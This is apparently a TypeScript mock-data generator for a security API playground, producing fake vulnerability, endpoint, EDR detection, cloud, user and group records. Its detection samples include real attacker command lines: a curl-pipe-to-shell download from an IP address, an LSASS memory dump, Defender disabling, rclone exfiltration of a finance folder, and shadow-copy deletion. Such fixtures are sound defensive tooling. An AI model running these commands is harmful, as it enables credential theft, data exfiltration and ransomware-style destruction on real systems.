/** Mock records for each unified model. Every record has the unified shape
 * the API returns and the provider-native shape it was normalized from, so
 * the playground can show both side by side. */

import type { ModelKey } from "./catalog";
import { createRng, makeId, type Rng, uuid } from "./random";

export type Json =
	| string
	| number
	| boolean
	| null
	| Json[]
	| { [key: string]: Json };

export interface JsonObject {
	[key: string]: Json;
}

export interface MockRecord {
	id: string;
	raw: JsonObject;
	unified: JsonObject;
}

const HOUR = 3_600_000;
const DAY = 24 * HOUR;

type Severity = "critical" | "high" | "medium" | "low";

interface CveSeed {
	cve: string;
	cvss: number;
	exploited: boolean;
	fixed: string;
	pkg: string;
	title: string;
}

const CVES: CveSeed[] = [
	{
		cve: "CVE-2024-3094",
		cvss: 10,
		exploited: true,
		fixed: "5.6.2",
		pkg: "xz-utils",
		title: "XZ Utils backdoor in liblzma",
	},
	{
		cve: "CVE-2021-44228",
		cvss: 10,
		exploited: true,
		fixed: "2.17.1",
		pkg: "log4j-core",
		title: "Apache Log4j2 JNDI remote code execution (Log4Shell)",
	},
	{
		cve: "CVE-2024-6387",
		cvss: 8.1,
		exploited: false,
		fixed: "9.8p1",
		pkg: "openssh-server",
		title: "OpenSSH signal handler race condition (regreSSHion)",
	},
	{
		cve: "CVE-2023-44487",
		cvss: 7.5,
		exploited: true,
		fixed: "1.25.3",
		pkg: "nginx",
		title: "HTTP/2 Rapid Reset denial of service",
	},
	{
		cve: "CVE-2023-4863",
		cvss: 8.8,
		exploited: true,
		fixed: "1.3.2",
		pkg: "libwebp",
		title: "libwebp heap buffer overflow in WebP lossless",
	},
	{
		cve: "CVE-2024-3400",
		cvss: 10,
		exploited: true,
		fixed: "11.1.2-h3",
		pkg: "pan-os",
		title: "PAN-OS GlobalProtect command injection",
	},
	{
		cve: "CVE-2023-46604",
		cvss: 10,
		exploited: true,
		fixed: "5.18.3",
		pkg: "activemq",
		title: "Apache ActiveMQ OpenWire deserialization RCE",
	},
	{
		cve: "CVE-2024-1086",
		cvss: 7.8,
		exploited: true,
		fixed: "6.7.3",
		pkg: "linux-kernel",
		title: "Linux kernel nf_tables use-after-free",
	},
	{
		cve: "CVE-2023-38545",
		cvss: 9.8,
		exploited: false,
		fixed: "8.4.0",
		pkg: "curl",
		title: "curl SOCKS5 heap buffer overflow",
	},
	{
		cve: "CVE-2022-22965",
		cvss: 9.8,
		exploited: true,
		fixed: "5.3.18",
		pkg: "spring-beans",
		title: "Spring Framework data binding RCE (Spring4Shell)",
	},
	{
		cve: "CVE-2023-22515",
		cvss: 10,
		exploited: true,
		fixed: "8.5.2",
		pkg: "confluence",
		title: "Atlassian Confluence broken access control",
	},
	{
		cve: "CVE-2024-23897",
		cvss: 9.8,
		exploited: true,
		fixed: "2.442",
		pkg: "jenkins",
		title: "Jenkins CLI arbitrary file read",
	},
	{
		cve: "CVE-2023-4911",
		cvss: 7.8,
		exploited: true,
		fixed: "2.38-4",
		pkg: "glibc",
		title: "glibc ld.so GLIBC_TUNABLES buffer overflow (Looney Tunables)",
	},
	{
		cve: "CVE-2024-21762",
		cvss: 9.8,
		exploited: true,
		fixed: "7.4.3",
		pkg: "fortios",
		title: "FortiOS SSL VPN out-of-bounds write",
	},
	{
		cve: "CVE-2023-34362",
		cvss: 9.8,
		exploited: true,
		fixed: "2023.0.1",
		pkg: "moveit-transfer",
		title: "MOVEit Transfer SQL injection",
	},
	{
		cve: "CVE-2024-27198",
		cvss: 9.8,
		exploited: true,
		fixed: "2023.11.4",
		pkg: "teamcity",
		title: "JetBrains TeamCity authentication bypass",
	},
	{
		cve: "CVE-2023-20198",
		cvss: 10,
		exploited: true,
		fixed: "17.9.4a",
		pkg: "ios-xe",
		title: "Cisco IOS XE web UI privilege escalation",
	},
	{
		cve: "CVE-2024-4577",
		cvss: 9.8,
		exploited: true,
		fixed: "8.3.8",
		pkg: "php",
		title: "PHP-CGI argument injection on Windows",
	},
	{
		cve: "CVE-2023-50164",
		cvss: 9.8,
		exploited: false,
		fixed: "6.3.0.2",
		pkg: "struts2-core",
		title: "Apache Struts file upload path traversal",
	},
	{
		cve: "CVE-2024-38063",
		cvss: 9.8,
		exploited: false,
		fixed: "KB5041585",
		pkg: "windows-tcpip",
		title: "Windows TCP/IP IPv6 remote code execution",
	},
	{
		cve: "CVE-2023-36884",
		cvss: 8.8,
		exploited: true,
		fixed: "KB5028407",
		pkg: "office",
		title: "Office and Windows HTML remote code execution",
	},
	{
		cve: "CVE-2024-21626",
		cvss: 8.6,
		exploited: false,
		fixed: "1.1.12",
		pkg: "runc",
		title: "runc working directory container breakout (Leaky Vessels)",
	},
	{
		cve: "CVE-2023-5528",
		cvss: 7.2,
		exploited: false,
		fixed: "1.28.4",
		pkg: "kubelet",
		title: "Kubernetes in-tree storage plugin privilege escalation",
	},
	{
		cve: "CVE-2024-45337",
		cvss: 9.1,
		exploited: false,
		fixed: "0.31.0",
		pkg: "golang.org/x/crypto",
		title: "x/crypto/ssh PublicKeyCallback authorization bypass",
	},
	{
		cve: "CVE-2024-29041",
		cvss: 6.1,
		exploited: false,
		fixed: "4.19.2",
		pkg: "express",
		title: "Express open redirect in malformed URLs",
	},
	{
		cve: "CVE-2024-37890",
		cvss: 7.5,
		exploited: false,
		fixed: "8.17.1",
		pkg: "ws",
		title: "ws denial of service with many HTTP headers",
	},
	{
		cve: "CVE-2023-45853",
		cvss: 9.8,
		exploited: false,
		fixed: "1.3.1",
		pkg: "zlib",
		title: "zlib MiniZip integer overflow",
	},
	{
		cve: "CVE-2024-0727",
		cvss: 5.5,
		exploited: false,
		fixed: "3.2.1",
		pkg: "openssl",
		title: "OpenSSL PKCS12 NULL pointer dereference",
	},
	{
		cve: "CVE-2023-48795",
		cvss: 5.9,
		exploited: false,
		fixed: "9.6",
		pkg: "openssh",
		title: "SSH Terrapin prefix truncation attack",
	},
	{
		cve: "CVE-2024-24790",
		cvss: 9.8,
		exploited: false,
		fixed: "1.22.4",
		pkg: "go-stdlib",
		title: "Go net/netip IPv4-mapped IPv6 misclassification",
	},
	{
		cve: "CVE-2024-47176",
		cvss: 8.4,
		exploited: false,
		fixed: "2.0.1",
		pkg: "cups-browsed",
		title: "CUPS cups-browsed remote printer injection",
	},
	{
		cve: "CVE-2022-42889",
		cvss: 9.8,
		exploited: false,
		fixed: "1.10.0",
		pkg: "commons-text",
		title: "Apache Commons Text variable interpolation RCE",
	},
	{
		cve: "CVE-2023-2650",
		cvss: 6.5,
		exploited: false,
		fixed: "3.1.1",
		pkg: "openssl",
		title: "OpenSSL ASN.1 object identifier DoS",
	},
	{
		cve: "CVE-2024-6345",
		cvss: 8.8,
		exploited: false,
		fixed: "70.0.0",
		pkg: "setuptools",
		title: "setuptools package_index remote code execution",
	},
	{
		cve: "CVE-2024-35195",
		cvss: 5.6,
		exploited: false,
		fixed: "2.32.0",
		pkg: "requests",
		title: "Requests session verify=False persists across calls",
	},
	{
		cve: "CVE-2024-22195",
		cvss: 5.4,
		exploited: false,
		fixed: "3.1.3",
		pkg: "jinja2",
		title: "Jinja2 xmlattr filter cross-site scripting",
	},
];

const HOST_ROLES = [
	"api",
	"web",
	"worker",
	"db",
	"cache",
	"bastion",
	"vpn",
	"build",
	"k8s-node",
	"kafka",
	"es",
	"jump",
	"mail",
	"dc",
	"fs",
];
const HOST_ENVS = ["prod", "stg", "dev", "corp"];
const LAPTOP_PREFIX = ["MBP", "LT", "DESKTOP", "WS"];

const FIRST = [
	"Maya",
	"Jonah",
	"Priya",
	"Lucas",
	"Amara",
	"Diego",
	"Hana",
	"Ethan",
	"Zara",
	"Noah",
	"Ines",
	"Kenji",
	"Leah",
	"Omar",
	"Sofia",
	"Theo",
	"Ava",
	"Ravi",
	"Chloe",
	"Mateo",
	"Nia",
	"Felix",
	"Yara",
	"Samir",
	"Elena",
	"Kofi",
	"Lina",
	"Marcus",
	"Aiko",
	"Owen",
];
const LAST = [
	"Chen",
	"Okafor",
	"Patel",
	"Romero",
	"Nakamura",
	"Schmidt",
	"Haddad",
	"Kowalski",
	"Mensah",
	"Ivanova",
	"Silva",
	"Brennan",
	"Park",
	"Novak",
	"Rossi",
	"Ahmed",
	"Lindqvist",
	"Moreau",
	"Tanaka",
	"Osei",
	"Dubois",
	"Kaur",
	"Fischer",
	"Costa",
	"Reyes",
];
const DEPARTMENTS = [
	"Engineering",
	"Security",
	"Finance",
	"Sales",
	"IT",
	"People",
	"Marketing",
	"Customer Success",
	"Legal",
	"Product",
];
const TITLES: Record<string, string[]> = {
	"Customer Success": ["CSM", "Support Engineer"],
	Engineering: [
		"Software Engineer",
		"Staff Engineer",
		"SRE",
		"Engineering Manager",
	],
	Finance: ["Controller", "FP&A Analyst"],
	IT: ["IT Administrator", "Helpdesk Technician"],
	Legal: ["Counsel", "Paralegal"],
	Marketing: ["Content Lead", "Growth Marketer"],
	People: ["People Partner", "Recruiter"],
	Product: ["Product Manager", "Product Designer"],
	Sales: ["Account Executive", "Sales Engineer"],
	Security: ["Security Engineer", "SOC Analyst", "CISO"],
};

const MITRE = [
	["TA0002", "Execution", "T1059.001", "PowerShell"],
	["TA0003", "Persistence", "T1547.001", "Registry Run Keys / Startup Folder"],
	[
		"TA0004",
		"Privilege Escalation",
		"T1068",
		"Exploitation for Privilege Escalation",
	],
	["TA0005", "Defense Evasion", "T1562.001", "Disable or Modify Tools"],
	["TA0006", "Credential Access", "T1003.001", "LSASS Memory"],
	["TA0007", "Discovery", "T1087.002", "Domain Account"],
	["TA0008", "Lateral Movement", "T1021.002", "SMB/Windows Admin Shares"],
	["TA0011", "Command and Control", "T1071.001", "Web Protocols"],
	["TA0010", "Exfiltration", "T1567.002", "Exfiltration to Cloud Storage"],
	["TA0040", "Impact", "T1486", "Data Encrypted for Impact"],
] as const;

const DETECTIONS = [
	{
		cmd: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...",
		mitre: 0,
		proc: "powershell.exe",
		title: "Encoded PowerShell command spawned by Office application",
	},
	{
		cmd: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\l.dmp full",
		mitre: 4,
		proc: "rundll32.exe",
		title: "LSASS memory dumped via comsvcs.dll",
	},
	{
		cmd: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\Users\\Public\\upd.exe",
		mitre: 1,
		proc: "reg.exe",
		title: "Suspicious Run key persistence",
	},
	{
		cmd: "Set-MpPreference -DisableRealtimeMonitoring $true",
		mitre: 3,
		proc: "powershell.exe",
		title: "Attempt to disable Microsoft Defender real-time protection",
	},
	{
		cmd: 'net group "Domain Admins" /domain',
		mitre: 5,
		proc: "net.exe",
		title: "Domain admin group enumeration",
	},
	{
		cmd: "psexec.exe \\\\FS-01 -s cmd.exe",
		mitre: 6,
		proc: "psexec.exe",
		title: "Remote service execution over SMB",
	},
	{
		cmd: "curl -s http://185.220.101.47/x | sh",
		mitre: 7,
		proc: "curl",
		title: "Download and execute from known-bad IP",
	},
	{
		cmd: "rclone copy C:\\Finance mega:backup --transfers 16",
		mitre: 8,
		proc: "rclone.exe",
		title: "Bulk file upload to cloud storage with rclone",
	},
	{
		cmd: "vssadmin delete shadows /all /quiet",
		mitre: 9,
		proc: "vssadmin.exe",
		title: "Volume shadow copies deleted (ransomware precursor)",
	},
	{
		cmd: "./pwnkit",
		mitre: 2,
		proc: "pwnkit",
		title: "Local privilege escalation exploit (PwnKit) detected",
	},
];

const CLOUD_CHECKS = [
	{
		fw: ["CIS AWS 2.1.4", "SOC 2 CC6.1"],
		sev: "high",
		title: "S3 bucket allows public read access",
		type: "aws_s3_bucket",
	},
	{
		fw: ["CIS AWS 1.4", "PCI DSS 8.3.1"],
		sev: "critical",
		title: "Root account has active access keys",
		type: "aws_iam_user",
	},
	{
		fw: ["CIS AWS 5.2", "NIST 800-53 SC-7"],
		sev: "high",
		title: "Security group allows 0.0.0.0/0 on port 22",
		type: "aws_security_group",
	},
	{
		fw: ["CIS AWS 3.1"],
		sev: "medium",
		title: "CloudTrail is not enabled in all regions",
		type: "aws_cloudtrail",
	},
	{
		fw: ["CIS AWS 2.3.1", "HIPAA 164.312(a)(2)(iv)"],
		sev: "medium",
		title: "RDS instance storage is not encrypted",
		type: "aws_rds_instance",
	},
	{
		fw: ["CIS Azure 3.7"],
		sev: "high",
		title: "Storage account allows anonymous blob access",
		type: "azure_storage_account",
	},
	{
		fw: ["CIS Azure 1.1.1"],
		sev: "critical",
		title: "Global admin without MFA",
		type: "azure_ad_user",
	},
	{
		fw: ["CIS GCP 3.6"],
		sev: "high",
		title: "Firewall rule allows SSH from the internet",
		type: "gcp_firewall_rule",
	},
	{
		fw: ["CIS GCP 1.4"],
		sev: "medium",
		title: "Service account has user-managed keys",
		type: "gcp_service_account",
	},
	{
		fw: ["CIS Kubernetes 5.2.2"],
		sev: "high",
		title: "Privileged container running in production cluster",
		type: "k8s_pod",
	},
	{
		fw: ["SOC 2 CC7.2"],
		sev: "low",
		title: "EBS default encryption disabled in region",
		type: "aws_region",
	},
	{
		fw: ["CIS AWS 1.10", "SOC 2 CC6.1"],
		sev: "medium",
		title: "IAM user console access without MFA",
		type: "aws_iam_user",
	},
	{
		fw: ["Wiz Toxic Combination"],
		sev: "critical",
		title: "Internet-exposed VM with critical vulnerability and admin role",
		type: "aws_ec2_instance",
	},
];

const REPOS = [
	"payments-api",
	"web-app",
	"auth-service",
	"mobile-ios",
	"infra-terraform",
	"data-pipeline",
	"admin-portal",
	"notifications",
	"billing-worker",
	"search-svc",
	"ml-platform",
	"docs-site",
];
const LANGS: Record<string, string> = {
	"admin-portal": "TypeScript",
	"auth-service": "Go",
	"billing-worker": "Python",
	"data-pipeline": "Python",
	"docs-site": "TypeScript",
	"infra-terraform": "HCL",
	"ml-platform": "Python",
	"mobile-ios": "Swift",
	notifications: "TypeScript",
	"payments-api": "Java",
	"search-svc": "Go",
	"web-app": "TypeScript",
};
const SAST_RULES = [
	[
		"javascript.express.security.audit.xss.direct-response-write",
		"CWE-79",
		"Cross-site scripting via unescaped response write",
		"src/routes/profile.ts",
	],
	[
		"python.lang.security.audit.formatted-sql-query",
		"CWE-89",
		"SQL query built with string formatting",
		"app/db/queries.py",
	],
	[
		"go.lang.security.audit.net.use-tls",
		"CWE-319",
		"HTTP server started without TLS",
		"cmd/server/main.go",
	],
	[
		"java.lang.security.audit.xxe.documentbuilderfactory-disallow-doctype-decl",
		"CWE-611",
		"XML parser vulnerable to XXE",
		"src/main/java/com/acme/XmlImport.java",
	],
	[
		"javascript.lang.security.detect-child-process",
		"CWE-78",
		"Command injection through child_process.exec",
		"scripts/thumbnail.js",
	],
	[
		"python.flask.security.audit.debug-enabled",
		"CWE-489",
		"Flask app runs with debug=True",
		"app/__init__.py",
	],
	[
		"terraform.aws.security.aws-s3-bucket-public-read",
		"CWE-284",
		"S3 bucket ACL grants public-read",
		"modules/storage/main.tf",
	],
] as const;
const SECRET_TYPES = [
	"AWS access key",
	"GitHub personal access token",
	"Stripe live secret key",
	"Slack bot token",
	"Private RSA key",
	"Google API key",
];

const COMPANIES = [
	"Northwind Health",
	"Globex",
	"Initech",
	"Umbrella Logistics",
	"Hooli",
	"Stark Freight",
	"Wayne Analytics",
	"Acme Corp",
	"Vandelay Imports",
	"Soylent Foods",
	"Cyberdyne Systems",
	"Tyrell Bio",
];

export const SANDBOX_DOMAIN = "sandbox.securefabric.dev";

function severityFromCvss(cvss: number): Severity {
	if (cvss >= 9) {
		return "critical";
	}
	if (cvss >= 7) {
		return "high";
	}
	if (cvss >= 4) {
		return "medium";
	}
	return "low";
}

const MILLIS = /\.\d{3}Z$/u;

function iso(ms: number): string {
	return new Date(ms).toISOString().replace(MILLIS, "Z");
}

function ipv4(rng: Rng, internal = true): string {
	return internal
		? `10.${rng.int(0, 40)}.${rng.int(0, 255)}.${rng.int(2, 254)}`
		: `${rng.pick([34, 52, 18, 35, 20, 104])}.${rng.int(0, 255)}.${rng.int(0, 255)}.${rng.int(2, 254)}`;
}

function mac(rng: Rng): string {
	return Array.from({ length: 6 }, () => rng.hex(2)).join(":");
}

interface Host {
	hostname: string;
	id: string;
	ip: string;
	platform: "linux" | "windows" | "mac";
}

function hostPool(rng: Rng, domain: string, count: number): Host[] {
	return Array.from({ length: count }, (_, i): Host => {
		const server = i % 3 !== 2;
		const platform = server
			? rng.weighted([
					["linux", 8],
					["windows", 2],
				] as const)
			: rng.weighted([
					["mac", 6],
					["windows", 4],
				] as const);
		const hostname = server
			? `${rng.pick(HOST_ROLES)}-${rng.pick(HOST_ENVS)}-${String(rng.int(1, 24)).padStart(2, "0")}`
			: `${rng.pick(LAPTOP_PREFIX)}-${rng.hex(6).toUpperCase()}`;
		return {
			hostname:
				platform === "windows" && !server ? hostname : `${hostname}.${domain}`,
			id: makeId("dev", rng),
			ip: ipv4(rng),
			platform,
		};
	});
}

interface Person {
	department: string;
	email: string;
	name: string;
	title: string;
}

function people(rng: Rng, domain: string, count: number): Person[] {
	return Array.from({ length: count }, (): Person => {
		const first = rng.pick(FIRST);
		const last = rng.pick(LAST);
		const department = rng.pick(DEPARTMENTS);
		return {
			department,
			email: `${first}.${last}@${domain}`.toLowerCase(),
			name: `${first} ${last}`,
			title: rng.pick(TITLES[department] ?? ["Analyst"]),
		};
	});
}

interface Ctx {
	domain: string;
	hosts: Host[];
	now: number;
	people: Person[];
	provider: string;
	rng: Rng;
}

function vulnerability(c: Ctx): MockRecord {
	const { rng, now, provider } = c;
	const seed = rng.pick(CVES);
	const host = rng.pick(c.hosts);
	const { cvss } = seed;
	const severity = severityFromCvss(cvss);
	const firstSeen = now - rng.int(2, 120) * DAY;
	const status = rng.weighted([
		["open", 70],
		["fixed", 18],
		["reopened", 7],
		["accepted", 5],
	] as const);
	const id = makeId("vuln", rng);
	const sourceId =
		provider === "qualys"
			? String(rng.int(38_000, 380_000))
			: String(rng.int(10_000, 200_000));
	const port = rng.pick([22, 80, 443, 8080, 8443, 3306, 5432, 0]);
	const unified: JsonObject = {
		asset: { hostname: host.hostname, id: host.id, ip: host.ip },
		cve: [seed.cve],
		cvss: { score: cvss, version: "3.1" },
		exploitable: seed.exploited,
		firstSeen: iso(firstSeen),
		id,
		lastSeen: iso(now - rng.int(1, 30) * HOUR),
		package: { fixedIn: seed.fixed, name: seed.pkg },
		port: port || null,
		severity,
		solution: `Upgrade ${seed.pkg} to ${seed.fixed} or later.`,
		source: provider,
		sourceId,
		status,
		title: seed.title,
		updatedAt: iso(now - rng.int(1, 72) * HOUR),
	};
	let raw: JsonObject;
	if (provider === "qualys") {
		raw = {
			DNS: host.hostname,
			FIRST_FOUND_DATETIME: iso(firstSeen),
			IP: host.ip,
			LAST_FOUND_DATETIME: unified.lastSeen as string,
			PORT: port ? String(port) : null,
			QID: Number(sourceId),
			SEVERITY: { critical: 5, high: 4, low: 2, medium: 3 }[severity],
			STATUS: {
				accepted: "Active",
				fixed: "Fixed",
				open: "Active",
				reopened: "Re-Opened",
			}[status],
			TYPE: "Confirmed",
			UNIQUE_VULN_ID: rng.int(1_000_000_000, 9_999_999_999),
		};
	} else if (provider === "crowdstrike") {
		raw = {
			aid: rng.hex(32),
			apps: [
				{
					product_name_version: `${seed.pkg} ${seed.fixed}`,
					remediation: { ids: [rng.hex(32)] },
				},
			],
			cid: rng.hex(32),
			created_timestamp: iso(firstSeen),
			cve: {
				base_score: cvss,
				exploit_status: seed.exploited ? 90 : 0,
				id: seed.cve,
				severity: severity.toUpperCase(),
			},
			host_info: {
				hostname: host.hostname,
				local_ip: host.ip,
				platform: host.platform === "mac" ? "Mac" : "Linux",
			},
			id: `${rng.hex(32)}_${rng.hex(32)}`,
			status: status === "fixed" ? "closed" : "open",
		};
	} else {
		raw = {
			asset: { hostname: host.hostname, ipv4: host.ip, uuid: uuid(rng) },
			first_found: iso(firstSeen),
			last_found: unified.lastSeen as string,
			plugin: {
				cve: [seed.cve],
				cvss3_base_score: cvss,
				exploit_available: seed.exploited,
				id: Number(sourceId),
				name: seed.title,
				solution: unified.solution as string,
				vpr: { score: Math.min(10, Math.round((cvss - rng.next()) * 10) / 10) },
			},
			port: { port, protocol: "TCP" },
			severity,
			state: status === "fixed" ? "FIXED" : "OPEN",
		};
	}
	return { id, raw, unified };
}

function device(c: Ctx, index: number): MockRecord {
	const { rng, now, provider } = c;
	const host = c.hosts[index % c.hosts.length] as Host;
	const person = rng.pick(c.people);
	const status = rng.weighted([
		["online", 75],
		["offline", 20],
		["isolated", 5],
	] as const);
	const osVersion = {
		linux: rng.pick([
			"Ubuntu 22.04.4 LTS",
			"Ubuntu 24.04.1 LTS",
			"Amazon Linux 2023",
			"RHEL 9.4",
			"Debian 12",
		]),
		mac: rng.pick(["macOS 15.1", "macOS 14.6.1", "macOS 15.0.1"]),
		windows: rng.pick([
			"Windows 11 23H2",
			"Windows 10 22H2",
			"Windows Server 2022",
			"Windows Server 2019",
		]),
	}[host.platform];
	const agentVersion =
		provider === "crowdstrike"
			? `7.${rng.int(14, 19)}.${rng.int(17_000, 18_999)}.0`
			: `${rng.int(23, 24)}.${rng.int(1, 4)}.${rng.int(1, 9)}.${rng.int(100, 999)}`;
	const unified: JsonObject = {
		agent: {
			health: rng.weighted([
				["healthy", 90],
				["degraded", 7],
				["reduced_functionality", 3],
			] as const),
			version: agentVersion,
		},
		firstSeen: iso(now - rng.int(30, 700) * DAY),
		hostname: host.hostname,
		id: host.id,
		ipv4s: [host.ip],
		lastSeen: iso(
			now - (status === "offline" ? rng.int(26, 400) : rng.int(0, 3)) * HOUR
		),
		lastUser: host.platform === "linux" ? null : person.email,
		macAddresses: [mac(rng)],
		osVersion,
		platform: host.platform,
		source: provider,
		status,
		tags: rng.sample(
			[
				"production",
				"pci",
				"internet-facing",
				"crown-jewel",
				"laptop",
				"contractor",
			],
			rng.int(0, 2)
		),
	};
	const raw: JsonObject =
		provider === "crowdstrike"
			? {
					agent_version: agentVersion,
					cid: rng.hex(32),
					device_id: rng.hex(32),
					external_ip: ipv4(rng, false),
					hostname: host.hostname.split(".")[0] ?? host.hostname,
					last_seen: unified.lastSeen as string,
					local_ip: host.ip,
					os_version: osVersion,
					platform_name: { linux: "Linux", mac: "Mac", windows: "Windows" }[
						host.platform
					],
					status: status === "isolated" ? "contained" : "normal",
				}
			: {
					fqdn: host.hostname,
					id: uuid(rng),
					ipv4: [host.ip],
					last_seen: unified.lastSeen as string,
					operating_system: [osVersion],
				};
	return { id: host.id, raw, unified };
}

function detection(c: Ctx): MockRecord {
	const { rng, now, provider } = c;
	const d = rng.pick(DETECTIONS);
	const [tacticId, tactic, techniqueId, technique] = MITRE[
		d.mitre
	] as (typeof MITRE)[number];
	const host = rng.pick(c.hosts);
	const person = rng.pick(c.people);
	const first = now - rng.int(1, 240) * HOUR;
	const severity = rng.weighted([
		["critical", 20],
		["high", 40],
		["medium", 30],
		["low", 10],
	] as const);
	const id = makeId("det", rng);
	const sha256 = rng.hex(64);
	const unified: JsonObject = {
		device: { hostname: host.hostname, id: host.id },
		firstEventAt: iso(first),
		id,
		lastEventAt: iso(first + rng.int(1, 90) * 60_000),
		mitre: [{ tactic, tacticId, technique, techniqueId }],
		process: { commandLine: d.cmd, name: d.proc, sha256 },
		severity,
		source: provider,
		status: rng.weighted([
			["new", 45],
			["in_progress", 25],
			["resolved", 30],
		] as const),
		title: d.title,
		user: person.email,
		verdict: rng.weighted([
			["true_positive", 50],
			["suspicious", 30],
			["false_positive", 20],
		] as const),
	};
	const raw: JsonObject =
		provider === "crowdstrike"
			? {
					cmdline: d.cmd,
					composite_id: `${rng.hex(32)}:ind:${rng.hex(32)}:${rng.int(1_000_000, 9_999_999)}`,
					device: { device_id: rng.hex(32), hostname: host.hostname },
					filename: d.proc,
					severity_name: severity[0]?.toUpperCase() + severity.slice(1),
					sha256,
					status: "new",
					tactic,
					tactic_id: tacticId,
					technique,
					technique_id: techniqueId,
					timestamp: iso(first),
					user_name: person.email.split("@")[0] ?? person.email,
				}
			: {
					agentDetectionInfo: { agentComputerName: host.hostname },
					id: String(rng.int(1e17, 9e17)),
					threatInfo: {
						classification: "Malware",
						confidenceLevel: "malicious",
						sha256,
						threatName: d.proc,
					},
				};
	return { id, raw, unified };
}

function cloudAccount(rng: Rng): {
	account: string;
	cloud: string;
	region: string;
} {
	const cloud = rng.weighted([
		["aws", 6],
		["azure", 2],
		["gcp", 2],
	] as const);
	const region = {
		aws: rng.pick(["us-east-1", "us-west-2", "eu-west-1"]),
		azure: rng.pick(["eastus", "westeurope"]),
		gcp: rng.pick(["us-central1", "europe-west1"]),
	}[cloud];
	const account = {
		aws: String(rng.int(100_000_000_000, 999_999_999_999)),
		azure: uuid(rng),
		gcp: `acme-${rng.pick(["prod", "data", "shared"])}-${rng.int(100, 999)}`,
	}[cloud];
	return { account, cloud, region };
}

function cloudFinding(c: Ctx): MockRecord {
	const { rng, now, provider } = c;
	const check = rng.pick(CLOUD_CHECKS);
	const acct = cloudAccount(rng);
	const id = makeId("cf", rng);
	const name = `${rng.pick(["acme", "prod", "data", "logs", "backup"])}-${rng.pick(["exports", "assets", "events", "db", "api", "billing"])}-${rng.hex(4)}`;
	const unified: JsonObject = {
		firstSeen: iso(now - rng.int(1, 90) * DAY),
		frameworks: check.fw,
		id,
		remediation: `See ${provider === "wiz" ? "Wiz" : "the provider"} remediation guide for ${check.type}.`,
		resource: {
			account: acct.account,
			cloud: acct.cloud,
			id: makeId("res", rng),
			name,
			region: acct.region,
			type: check.type,
		},
		severity: check.sev,
		source: provider,
		status: rng.weighted([
			["open", 70],
			["resolved", 25],
			["ignored", 5],
		] as const),
		title: check.title,
	};
	const raw: JsonObject =
		provider === "wiz"
			? {
					createdAt: unified.firstSeen as string,
					entitySnapshot: {
						cloudPlatform: acct.cloud.toUpperCase(),
						name,
						region: acct.region,
						subscriptionExternalId: acct.account,
						type: check.type.toUpperCase(),
					},
					id: uuid(rng),
					severity: check.sev.toUpperCase(),
					sourceRule: { name: check.title },
					status: "OPEN",
					type: "CLOUD_CONFIGURATION",
				}
			: {
					AwsAccountId: acct.account,
					Compliance: { Status: "FAILED" },
					Id: `arn:aws:securityhub:${acct.region}:${acct.account}:finding/${uuid(rng)}`,
					Resources: [{ Id: name, Region: acct.region, Type: check.type }],
					Severity: { Label: check.sev.toUpperCase() },
					Title: check.title,
				};
	return { id, raw, unified };
}

function cloudResource(c: Ctx): MockRecord {
	const { rng, now, provider } = c;
	const acct = cloudAccount(rng);
	const type = rng.pick([
		"aws_ec2_instance",
		"aws_s3_bucket",
		"aws_iam_role",
		"aws_lambda_function",
		"aws_rds_instance",
		"azure_vm",
		"gcp_gke_cluster",
		"aws_eks_cluster",
	]);
	const id = makeId("res", rng);
	const name = `${rng.pick(["api", "etl", "web", "auth", "ml", "logs"])}-${rng.pick(["prod", "stg", "shared"])}-${rng.hex(4)}`;
	const unified: JsonObject = {
		account: acct.account,
		cloud: acct.cloud,
		createdAt: iso(now - rng.int(5, 900) * DAY),
		id,
		internetExposed: rng.bool(0.18),
		name,
		region: acct.region,
		source: provider,
		tags: {
			env: rng.pick(["prod", "staging", "dev"]),
			owner: rng.pick(["platform", "data", "payments", "security"]),
		},
		type,
	};
	return {
		id,
		raw: {
			externalId: `${acct.cloud}:${acct.account}:${name}`,
			nativeType: type,
			providerUniqueId: uuid(rng),
		},
		unified,
	};
}

function user(c: Ctx, index: number): MockRecord {
	const { rng, now, provider } = c;
	const p = c.people[index % c.people.length] as Person;
	const id = makeId("usr", rng);
	const status = rng.weighted([
		["active", 88],
		["suspended", 7],
		["deprovisioned", 5],
	] as const);
	const mfa = rng.bool(0.86);
	const unified: JsonObject = {
		createdAt: iso(now - rng.int(30, 1400) * DAY),
		department: p.department,
		email: p.email,
		id,
		isAdmin:
			p.department === "IT" || p.department === "Security"
				? rng.bool(0.5)
				: rng.bool(0.03),
		lastLoginAt: status === "active" ? iso(now - rng.int(1, 200) * HOUR) : null,
		mfa: {
			enabled: mfa,
			factors: mfa
				? rng.sample(["push", "totp", "webauthn", "sms"], rng.int(1, 2))
				: [],
		},
		name: p.name,
		source: provider,
		status,
		title: p.title,
	};
	const raw: JsonObject =
		provider === "okta"
			? {
					_links: {},
					created: unified.createdAt as Json,
					id: `00u${rng.hex(17)}`,
					lastLogin: unified.lastLoginAt as Json,
					profile: {
						department: p.department,
						email: p.email,
						firstName: p.name.split(" ")[0] ?? "",
						lastName: p.name.split(" ")[1] ?? "",
						login: p.email,
						title: p.title,
					},
					status: status.toUpperCase(),
				}
			: {
					accountEnabled: status === "active",
					department: p.department,
					displayName: p.name,
					id: uuid(rng),
					jobTitle: p.title,
					mail: p.email,
					signInActivity: { lastSignInDateTime: unified.lastLoginAt as Json },
					userPrincipalName: p.email,
				};
	return { id, raw, unified };
}

function group(c: Ctx, index: number): MockRecord {
	const { rng, provider } = c;
	const names = [
		"Engineering",
		"Security",
		"Finance",
		"All Employees",
		"AWS-Admins",
		"GitHub-Owners",
		"Contractors",
		"Okta-Admins",
		"Production-Access",
		"Sales",
		"On-call",
		"Break-glass",
	];
	const name = names[index % names.length] as string;
	const id = makeId("grp", rng);
	return {
		id,
		raw: { id: provider === "okta" ? `00g${rng.hex(17)}` : uuid(rng), name },
		unified: {
			description: `${name} group`,
			id,
			memberCount: rng.int(2, 340),
			name,
			source: provider,
			type: rng.pick(["static", "dynamic"]),
		},
	};
}

function codeFinding(c: Ctx): MockRecord {
	const { rng, now, provider } = c;
	const repo = rng.pick(REPOS);
	const type = rng.weighted([
		["sca", 50],
		["sast", 30],
		["secret", 10],
		["iac", 10],
	] as const);
	const id = makeId("cfd", rng);
	const base: JsonObject = {
		firstSeen: iso(now - rng.int(1, 120) * DAY),
		id,
